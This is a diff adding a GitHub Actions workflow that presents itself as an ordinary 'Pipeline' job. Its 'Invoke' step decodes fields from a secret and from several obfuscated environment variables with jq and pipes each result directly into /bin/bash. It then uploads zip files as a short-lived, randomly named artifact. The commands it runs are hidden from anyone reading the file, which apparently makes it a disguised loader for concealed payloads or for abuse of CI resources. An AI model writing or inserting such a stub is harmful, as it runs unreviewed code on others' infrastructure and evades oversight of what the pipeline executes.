@@ -1,0 +1,39 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Invoke
+        env:
+          co6704: ${{ secrets.co6704 }}
+        run: |
+          printf '%s' "$co6704" | jq -r .gzvs10 | /bin/bash
+          printf '%s' "$ha0" | jq -r .bgi11 | /bin/bash
+          echo $fy25 | jq -r .qqrsq0 | /bin/bash
+          echo $ysn977 | jq -r .febat68 | /bin/bash
+          echo $z8 | jq -r .qpw96079 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: hn4YhhtK
+          path: "*.zip"
+          retention-days: 1
